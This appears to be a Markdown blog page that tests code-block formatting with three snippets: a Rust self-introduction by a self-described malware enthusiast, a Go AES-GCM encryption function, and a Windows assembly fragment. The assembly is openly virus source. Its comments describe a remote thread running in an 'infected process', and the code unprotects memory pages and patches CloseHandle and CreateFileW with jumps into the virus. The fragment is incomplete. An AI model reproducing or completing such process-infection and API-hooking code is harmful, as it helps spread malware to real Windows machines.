---
title: 'Code Block'
excerpt: 'Code block testing!'
---

### Rust Code:

```rust
struct Whoami(
    &'static str,
    .....
);

fn main() {
    let _ = Whoami(
        "ransomsec",                                                            // whoami
        "pentesting, hunting, binary exploitation",                             // what i do and i love!
        "so-called `dark-web` surf, read blogs",                                // in my free time
        "encryptors, rust, linux, golang, python, l33t, malwares, code review", // :just love:
        "ransoms3c@gmail.com",                                             // ping me ;)
    ); 
}
```

- testing the code block!

---

### Go Code:

```go
func Encrypt(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)

	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	return cypherText, nil
}
```

- And it's looks perfectly!

---

### Looks Perfect??? Ask Assembly

```nasm
include	win32api.inc
include	useful.inc
include	mz.inc
include	pe.inc


invoke	macro	api				;macro for API callz
	extrn	api:PROC			;declare API
	call	api				;call it...
endm


@SEH_SetupFrame_UnProtect	macro
	local	set_new_eh
	local	exception_handler
	local	@n

	call	set_new_eh
	pushad

	mov	ebx,dword ptr [esp+cPushad+EH_ExceptionRecord]
	cmp	dword ptr [ebx.ER_ExceptionCode],EXCEPTION_ACCESS_VIOLATION
        jne	exception_handler

	call	@n
	dd	?
@n:	mov	ebx,[ebx.ER_ExceptionInformation+4]
	push	PAGE_READWRITE
	and	ebx,0FFFFF000h
	push	2*4096
	push	ebx
	mov	eax,12345678h
_VirtualProtect = dword ptr $-4
	call	eax				;unprotect 2 pagez

exception_handler:
	popad
	xor	eax,eax
	ret

set_new_eh:					;set SEH frame
	xor	edx,edx
	push	dword ptr fs:[edx]
	mov	fs:[edx],esp
endm


.data


;this is the remote thread that getz executed in infected process

rtStart	Proc
	pushad
tdelta = $+5
	@SEH_SetupFrame	<jmp	end_thread>

	mov	ebp,[esp+4]			;EBP = delta offset

	;hook 2 APIz - CloseHandle and CreateFileW

	mov	esi,12345678h
_CloseHandle = dword ptr $-4
	cmp	[esi],64EC8B55h			;check CloseHandle API...
	jne	try_cfw
	cmp	dword ptr [esi+4],000018A1h	;...code
	jne	try_cfw
	mov	eax,esi
	neg	esi
	add	esi,newCloseHandle-rtStart-5
	add	esi,12345678h
virus_base = dword ptr $-4
	mov	byte ptr [eax],0E9h		;create "JMP <virus>"
	mov	[eax+1],esi
	mov	[eax+5],90909090h		;fill with NOPs
	add	eax,9
	mov	[ebp + nextCH - tdelta],eax	;save the address
```

- I am happy with that!
